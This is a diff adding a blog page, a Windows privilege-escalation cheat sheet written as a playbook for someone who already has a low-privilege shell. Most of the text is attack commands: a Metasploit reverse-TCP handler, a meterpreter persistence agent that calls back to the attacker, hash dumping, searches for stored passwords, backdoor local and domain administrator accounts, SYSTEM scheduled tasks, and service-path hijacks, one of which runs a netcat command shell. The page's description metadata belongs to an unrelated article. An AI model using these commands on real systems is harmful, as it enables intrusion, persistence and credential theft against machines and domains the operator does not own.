@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+
+    
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Tech Motion">
+<meta property="og:description" content="[ 繁體中文版本  |  English Version ]  This is a side story&#x2F;extra bug while I’m preparing for my Black Hat USA presentation. I believe most of the details have already been covered in the official advis">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-06-06T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-04T18:24:08.723Z">
+<meta property="article:author" content="Tech Motion">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+    
+
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/aero-cover.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/aero-cover.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/aero-cover.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>Windows Privilege Escalation - Resources</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Tech Motion" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/aero-cover.png" />
+    
+  
+    <div id="title">
+      <a class="u-url u-uid" href="/"> <h1 class="p-name">Tech Motion</h1> </a>
+    </div>
+  
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+      Windows Privilege Escalation - Resources
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+      </span>
+      
+    <div class="postdate">
+      
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+
+    <p><strong>TL;DR</strong><br>+ <strong>WHOAMI</strong>?<br>whoami<br><meta http-equiv="content-type" content="text/html; charset=utf-8"></meta>+ <strong>CAN I DO SPECIAL THINGS</strong>?<br>WHOAMI /PRIV<br>+ <strong>SERVICES</strong> <strong>--></strong> SERVICES AT BOOT <strong>&amp;</strong> SERVICES RAN THROUGH <strong>ICACLS</strong>.<strong>EXE</strong><br>wmic service get name,startname<br>NET START<br>+ <strong>NETWORK</strong> <meta http-equiv="content-type" content="text/html; charset=utf-8"></meta><strong>CAPABILITIES?</strong> (CHECKS FOR 127)<br>+ <strong>SHELL</strong> <strong>CAPABILITY</strong> <strong>--></strong> STAGED/NON-STAGED? FORMAT? ARCH? ENCODER? BIND/REVERSE?<br>+ <strong>SHELL</strong> <meta http-equiv="content-type" content="text/html; charset=utf-8"></meta><strong>CAPABILITY</strong> <strong>--></strong> ENSURE CODE EXEC.<br>+ <strong>NETWORK CAPABILITY.</strong><br>NETSTAT -ANOY<br>+ <strong>NET USERS</strong> (LATERAL MOVEMENT CAPABILITIES?)<br>NET USERS<br>NET LOCALGROUP<br>NET USER &lt;USERNAME> (AM I ADMIN? ANY SPECIAL GROUPS?)<br>+ <strong>ADMIN CAPABILITY?</strong><br>NET LOCALGROUP ADMINISTRATORS<br>+ <strong>PERMITTED TRAFFIC</strong> <strong>CAPABILITY</strong>???<br>netsh advfirewall firewall show rule name=<strong>all</strong><br>netsh advfirewall firewall show rule name=<strong>inbound</strong><br>netsh advfirewall firewall show rule name=<strong>outbounD</strong><br>+ <strong>FILE TRANSFER CAPABILITY</strong>???<br>CERTUTIL?<br>FTP?<br>TFTP?<br>VB?<br>PS?<br>SMB?<br>NFS?<br>+ <strong>ANY SCHEDULED TASKS I/O OPERATIONS</strong>?<br>C:\ > schtasks /query /fo LIST /v > schtasks.txt<br>+ <strong>BINPATHS</strong>?<br>SC.EXE<br>[ <strong>+</strong> More to Come ]<br><br><strong>Other Articles:</strong><br><a rel="noreferrer noopener" href="https://www.fuzzysecurity.com/tutorials/16.html" target="_blank">https://www.fuzzysecurity.com/tutorials/16.html</a><br><a rel="noreferrer noopener" href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation" target="_blank">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</a><br><br>+ <strong>Pro-tip - To prevent your shell from hanging as a result of any of these commands, prefix them with this!</strong><br>cmd.exe /c &lt;commands><br>cmd.exe /c start &lt;commands><br><br><strong>+ Pro-tip - Windows Powershell Execution Policy Bypass:</strong><br>PowerShell.exe -ExecutionPolicy UnRestricted -File .shell.ps1</p>
+
+
+
+    <p><br>+ <strong>I just got shell on windows! What would S1REN do?</strong><br><strong>--&gt;</strong> Get a meterpreter shell.<br>When it comes to a windows machine and receiving a low privilege shell - I do not mess around. I will always immediately work to maintain access and gain a more useful shell with meterpreter.<br>msfconsole<br>use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST &lt;Attacking Machine IP&gt;<br>set LPORT &lt;Listening Port&gt;<br><br><strong>Maintaining Access with Meterpreter:</strong><br><a rel="noreferrer noopener" href="https://www.offensive-security.com/metasploit-unleashed/maintaining-access/" target="_blank">https://www.offensive-security.com/metasploit-unleashed/maintaining-access/</a></p>
+    
+    
+    
+    <pre id="pre-msfu" class="wp-block-preformatted"><strong>meterpreter&gt;</strong> run persistence -U -i 5 -p 443 -r &lt;Attacking Machine IP&gt;
+    <strong>[*]</strong> Creating a <strong>persistent</strong> agent: <strong>LHOST</strong>=&lt;Attacking Machine IP&gt; <strong>LPORT</strong>=443 (interval=5 onboot=true)
+    <strong>[*]</strong> <strong>Persistent</strong> agent script is 613976 bytes long
+    <strong>[*]</strong> Uploaded the <strong>persistent</strong> agent to <strong>C:\WINDOWS\TEMP\yyPSPPEn.vbs</strong>
+    <strong>[*]</strong> Agent executed with <strong>PID 492</strong>
+    <strong>[*]</strong> <strong>Installing</strong> <strong>into autorun</strong> as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
+    <strong>[*]</strong> <strong>Installed</strong> <strong>into</strong> <strong>autorun</strong> as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
+    <strong>[*]</strong> For <strong>cleanup</strong> use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
+    <strong>meterpreter&gt;</strong>
+    <strong>meterpreter&gt;</strong> <strong>reboot</strong> 
+    Rebooting... 
+    <strong>meterpreter&gt;</strong> <strong>exit</strong> 
+    <strong>meterpreter&gt;</strong> <strong>sysinfo</strong>
+    Computer: XEN-XP-SP2-BARE
+    OS      : Windows XP (Build 2600, Service Pack 2).
+    Arch    : x86
+    Language: en_US
+    <strong>meterpreter&gt;</strong></pre>
+    
+    
+    
+    <p>+ <strong>Forward out a <em>vulnerable</em> <em>service</em> with meterpreter.</strong><br><strong>meterpreter&gt;</strong> portfwd add -l &lt;Attacker PORT&gt; -p &lt;Victim PORT&gt; -r &lt;Victim IP&gt;<br><strong>meterpreter&gt;</strong> portfwd add -l 3306 -p 3306 -r &lt;Victim IP&gt;<br><strong>$ </strong>rdesktop 0.0.0.0 <br><br>+ <strong>Dude just do this with your meterpreter shell - trust S1REN.</strong><br>use exploit/windows/local/service_permissions</p>
+    
+    
+    
+    <p>+ <strong>Payloads</strong><br><strong>--&gt;</strong> Checkbox target machine's <strong>file arch</strong> (x86, x64).<br><strong>--&gt;</strong> Checkbox target machine for <em><strong>staged</strong></em> OR <em><strong>non-staged</strong></em> payloads.. <br><br>+ <strong>Execute a Powershell Script.</strong><br>powershell.exe 'C:\Tools\<strong>privesc.ps1</strong>'<br><br>+ <strong>I need to enumerate out the System Information.</strong> <br><em><strong>Save this info</strong></em> - it can be utilized with other windows privesc checking tools (based on installed patches, OS Versioning, etc)<br>systeminfo<br><br>+ <strong>Who am I?</strong><br>whoami<br>echo %username%</p>
+    
+    
+    
+    <p>+ <strong>Privileges</strong><br>whoami /priv<br><br>+ <strong>List out all NT AUTHORITY/SYSTEM Services.</strong><br>wmic service get name,startname |FINDSTR "NT"<br><br>+ <strong>Print Nightmare?</strong><br>whoami /priv<br>SetImpersonatePrivilege Enabled? 🙂 </p>
+    
+    
+    
+    <p>+ <strong>Domain Box? </strong><br>Bloodhound? Sharphound?</p>
+    
+    
+    
+    <p>+ <strong>Can we Install Things <em>Elevated</em>?</strong><br>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>[Installing Elevated]<br>msiexec /i &lt;path to msi file&gt;<br><br>+ <strong>Some Domains.xml Abuse.</strong><br><a href="https://github.com/FSecureLABS/SharpGPOAbuse">https://github.com/FSecureLABS/SharpGPOAbuse</a></p>
+    
+    
+    
+    <p><br>+ <strong>Will the path to privilege escalation lie in a executable binary or service in Program Files? Is it listening on local only and thus we missed it from the outside scans?</strong><br>cd "C:\Program Files"<br>DIR /A /O /Q<br><br>cd "C:\Program Files (x86)"<br>DIR /A /O /Q<br><br>+ <strong>What is my current user's privileges?</strong><br>net user someWindowsUser<br><br>+ <strong>What are other user's privileges?</strong> <br>net users<br><br>+<strong> Hash Collection:</strong><br><strong>pg_dump</strong>.exe<strong><br></strong>meterpreter &gt; <strong>hashdump</strong></p>
+    
+    
+    
+    <p><strong>ntds.dit exfiltration.<br></strong><br>+ <strong>Who's the Administrator(s) around here?</strong><br>net localgroup administrators<br><br>+ <strong>Might we be able to move laterally to them if they are Administrators?</strong><br>net user somePotentialAdminUser<br><br>+ <strong>Firewall Information?</strong><br>netsh firewall show state<br>netsh firewall show config<br><br>+ <strong>Network Information</strong> (<em>who am I connected to? can anything off of Loopback be forwarded out to 0.0.0.0?</em>)<br>netstat -anoy<br>route print<br>arp -A<br>ipconfig /all<br><br>+ <strong>Cleartext Passwords in Files? Search for them.</strong><br>findstr /si password *.txt<br>findstr /si password *.xml<br>findstr /si password *.ini<br><br>+ <strong>Find all those password and credential strings in config files.</strong><br>dir /s <em>pass</em> == <em>cred</em> == <em>vnc</em> == <em>.config</em><br><br>+ <strong>Find all passwords in all files...</strong><br>findstr /spin "password" <em>.</em><br><br>+ <strong>WINDOWS SHARES.</strong><br>NET SHARE<br>NET USE<br><br><strong>--&gt; CREATE A SHARE ON WINDOWS FROM THE COMMAND LINE:</strong><br>NET SHARE &lt;sharename&gt;=&lt;drive/folderpath&gt; /remark: "This is my share."<br><strong>--&gt; MOUNT A WINDOWS SHARE FROM THE COMMAND LINE:</strong><br>NET USE Z: \\COMPUTER_NAME\SHARE_NAME /PERSISTENT:YES<br><strong>--&gt;</strong> <strong>UNMOUNT SHARE:</strong><br>NET USE Z: /DELETE<br><strong>--&gt;</strong> <strong>DELETE A SHARE ENTIRLEY:</strong><br>NET SHARE /DELETE<br><br>+ <strong>Find ALL weak file permissions per drive.</strong><br>accesschk.exe -uwqs Users c:*.*<br><br>+ <strong>A part of group "Authenticated Users" - you would be surprised if you have a real user.</strong><br>accesschk.exe -uwqs "Authenticated Users" c:*.*<br><br><br>+ <strong>Add an Administrator User with all of the goodies.</strong><br>cmd.exe /c net user siren superPassword /add<br>cmd.exe /c net localgroup administrators siren /add<br>cmd.exe /c net localgroup "Remote Desktop Users" siren /add<br><br>+ <strong>Adding a Windows Domain Administrator from the Command Line:</strong><br>cmd.exe /c net user siren superPassword /add<br>net localgroup Administrators siren /ADD /DOMAIN<br>net localgroup "Remote Desktop Users" siren /ADD /DOMAIN<br>net group "Domain Admins" siren /ADD /DOMAIN<br>net group "Enterprise Admins" siren /ADD /DOMAIN<br>net group "Schema Admins" siren /ADD /DOMAIN<br>net group "Group Policy Creator Owners" siren /ADD /DOMAIN<br><br>+ <strong>Time and our own <em>Scheduled Tasks</em>.</strong><br>time<br>The current time is: 6:41:05.81<br>at 06:42 /interactive "C:\Tools\sirenMaint.exe"<br><br>+ <strong>Create a Task. Run as System. Every 5 minutes. Path to binary.</strong><br>schtasks /create /ru SYSTEM /sc MINUTE /MO 5 /tn RUNME /tr "\"C:\Tools\sirenMaint.exe\""<br><strong>Attacking Machine:</strong><br>nc -lvp 443<br><strong>Victim Machine:</strong><br>schtasks /RUN /TN "RUNME"<br><br>+ <strong>Fun with Accesschk Enumeration!</strong><br><span style="text-decoration: underline;">accesschk.exe /accepteula</span> (<em>always do this first!!!!!</em>)<br><span style="text-decoration: underline;">accesschk.exe -ucqv [service_name]</span> (requires sysinternals accesschk!)<br><span style="text-decoration: underline;">accesschk.exe -uwcqv "Authenticated Users" *</span> (<em>won't yield anything on Win 8</em>)<br><span style="text-decoration: underline;">accesschk.exe -ucqv [service_name]</span><br><br><strong>#Find ALL weak folder permissions, per drive.</strong><br><span style="text-decoration: underline;">accesschk.exe -uwdqs Users c:\</span><br><span style="text-decoration: underline;">accesschk.exe -uwdqs "Authenticated Users" c:\</span><br><span style="text-decoration: underline;">accesschk.exe -uwqs Users c:*.*</span><br><span style="text-decoration: underline;">accesschk.exe -uwqs "Authenticated Users" c:*.*</span><br><br><br>+ <strong>Let me guess, you came in as NT AUTHORITY\<span style="text-decoration: underline;">NETWORK SERVICE</span></strong> <strong>?</strong><br>MS09-012.exe "whoami"<br>Initiate Network-Related Transfer <em>Again</em>.<br>MS09-012.exe "ftp -v -n -s:ftp.txt" and come back in NT Shell.</p>
+    
+    
+    
+    <p><br>+ <strong>I enumerated a weak service path on the machine. How do I exploit this... S1REN?</strong><br>sc config UPNPHOST binpath= "C:\Tools\sirenMaint.exe"<br>sc config UPNPHOST obj= ".\LocalSystem" password= ""<br>sc config SSDPSRV binpath= "C:\inetpub\siren\sirenMaint.exe"<br>sc config SSDPSRV obj= ".\LocalSystem" password= ""<br>sc config SSDPSRV start= "demand"<br>(<em>Now, Stage matching msfvenom Payload Listener in Meterpreter</em>)<br>net stop SSDPSRV<br>net start SSDPSRV<br><br>+ <strong>Up to Vista...</strong><br>psexec -i -s cmd.exe<br><br>+ <strong>On Windows XP and Older we can get an Administrator Privilege shell.</strong><br></p>
+    
+    
+    
+    <p><em><strong>--&gt;</strong></em> IF you have a GUI with a USER THAT IS INCLUDED IN THE Administrators GROUP you first<br>need to open up cmd.exe for the administrator. If you open up the cmd that is in<br>Accessories it will be opened up as a normal user. And if you rightclick and do<br>Run as Administrator you might need to know the Administrators password. Which<br>you might not know. So instead you open up the cmd from C:\windows\system32\cmd.exe.<br>This will give you a cmd with <em>Administrators Rights</em>.</p>
+    
+    
+    
+    <p><strong>--&gt;</strong> <em>From here, we want SYSTEM level privileges, no?</em><br><strong>--&gt;</strong> First we check what time it is on the local machine.<br>time<br><strong>--&gt;</strong> Now we set the time we want the system CMD to start.<br><strong>--&gt;</strong> Probably one minuter after the time.<br>at 01:23 /interactive cmd.exe<br><strong>System Shell.</strong><br><br>+ <strong>Ahh, so you're interested in UNQUOTED SERVICE PATHS... eh?</strong><br>wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\" |findstr /i /v """<br><br><strong>--&gt;</strong> Using SC:<br>sc query<br>sc qc &lt;service name&gt;<br><br><em><strong>--&gt;</strong></em> Okay S1REN, what am I looking for here?<br>If the results of the above command's value of path only contains "" and spaces - it's vulnerable.<br><br><em><strong>--&gt;</strong></em> Have a hit?<br><em><strong>--&gt;</strong></em> Use icacls or cacls.exe (both native to Windows) to check binary permissions.<br>icacls "C:\Program Files (x86)\UNQUOTED_SERVICE_PATH_SOFTWARE"<br><br><em><strong>--&gt;</strong></em> <em>Exploit it. </em><br><em><strong>--&gt;</strong></em> <em>If the path of the Binary file is:</em><br>C:\Program Files\something\something.exe<br><em><strong>--&gt;</strong></em> <em>Then,</em><br>move something.exe something.exe.BACK<br>move sirenMaint.exe C:\Program Files\something\<br>move sirenMaint.exe something.exe<br><br><em><strong>--&gt;</strong></em> Well, wasn't that fun? Now our payload will get executed instead of the intended exe!<br><em><strong>--&gt;</strong></em> <em>Nice.</em><br><br><strong>#S1REN, is there a better way to enumerate out every service and then just check for which of them has an Unquoted Bin Paths?<br></strong><em><strong>--&gt;</strong> Yup.</em><br><strong>--&gt;</strong> <em>Thanks S1REN!</em><br>cd "C:\Windows\TEMP"<br>sc query state= all | findstr "SERVICE_NAME:" &gt;&gt; ServiceNames.txt<br>FOR /F %i in (ServiceNames.txt) DO echo %i<br>type ServiceNames.txt<br>FOR /F "tokens=2 delims= " %i in (ServiceNames.txt) DO @echo %i &gt;&gt; Services.txt<br>FOR /F %i in (Services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt<br>type path.txt<br><br><em>Nice.</em><br><br><strong>#Continued</strong><br><strong>--&gt;</strong> S1REN.<br><strong>--&gt;</strong> Yes?<br><strong>--&gt;</strong> Is there a way to do essentially the same thing and then recursively execute icacls.exe or cacls.exe on them to get the information I need?<br><strong>--&gt;</strong> Yup.<br>cd "C:\Windows\TEMP\"<br>for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; C:\windows\temp\permissions.txt<br><br><strong>icacls.exe:</strong><br>for /f eol^=^"^ delims^=^" %a in (C:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"<br><br><strong>cacls.exe</strong><br>for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c cacls "%a"<br><br>IF YOU FIND A SERVICE THAT HAS WRITE PERMISSIONS set to "EVERYONE", you can change<br>that binary INTO YOUR OWN CUSTOM BINARY and make it execute in the privileged context. <br></p>
+    
+    
+    
+    <p>+ <strong>Dealing with Scheduled Tasks with SYSTEM Privileges. </strong><br><strong>--&gt;</strong> Here we are looking for tasks that are run by a privileged user, and run a binary<br>that we can overwrite.<br>schtasks /query /fo LIST /v &gt; schtask.txt<br>type schtask.txt<br>(Copy that output to a temporary file </p>
+    
+    
+    
+    <p><strong>--&gt; </strong>Yeah I know this ain't pretty, but it works. You can of course change the name<br>SYSTEM to another privileged user. In other words, copy the output into Kali and<br>just grep for SYSTEM.<br><strong>--&gt;</strong> Nice, S1REN.<br><strong>--&gt; </strong>Thanks.<br>cat schtask.txt | grep "SYSTEM|Task To Run" | grep -B 1 SYSTEM --color=auto<br><br><strong>--&gt;</strong> <strong>Now, Change up the UPNP Service Binary Path (for example):</strong><br>sc config upnphost binpath= "C:\Tools\nc.exe -nlvp 6666 -e C:\Windows\system32\cmd.exe"<br>sc config upnphost obj= ".\LocalSystem" password= ""<br>sc config upnphost depend= ""<br>net stop &lt;service&gt;<br><strong>--&gt;</strong> Attacking Machine<br>nc -nlvp 6666<br>net start &lt;service&gt;<br><br><strong>Tools:</strong><br>(Remember how I said to save a local copy of that systeminfo output?)<br><a rel="noreferrer noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a> <br><br>+ <strong>How do I cross-compile payloads for Windows on Linux, S1REN?</strong><br><strong>--&gt;</strong> Dude, <em>check this out</em>.<br>apt-get install mingw-w64<br><br><strong>+ Cross-Compilation Reference:</strong><br># Ci686-w64-mingw32-gcc hello.c -o hello32.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br># 32-bitx86_64-w64-mingw32-gcc hello.c -o hello64.exe&nbsp;&nbsp;&nbsp;&nbsp;<br># 64-bit&nbsp;# C++i686-w64-mingw32-g++ hello.cc -o hello32.exe&nbsp;&nbsp;&nbsp;&nbsp; <br># 32-bitx86_64-w64-mingw32-g++ hello.cc -o hello64.exe&nbsp;&nbsp; # 64-bit</p>
+    
+
+    <p><br>+ <strong>Migrate to a stable process.</strong><br>https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/<br><strong>--&gt;</strong> "<em>Using the&nbsp;<strong>migrate</strong>&nbsp;post module, you can migrate to another process on the victim.</em>"<br><strong>meterpreter&gt;</strong> run post/windows/manage/migrate<br><strong>meterpreter&gt;</strong> migrate -h<br><strong>meterpreter&gt;</strong> migrate &lt;PID&gt;</p>
+
+
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Tech Motion
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
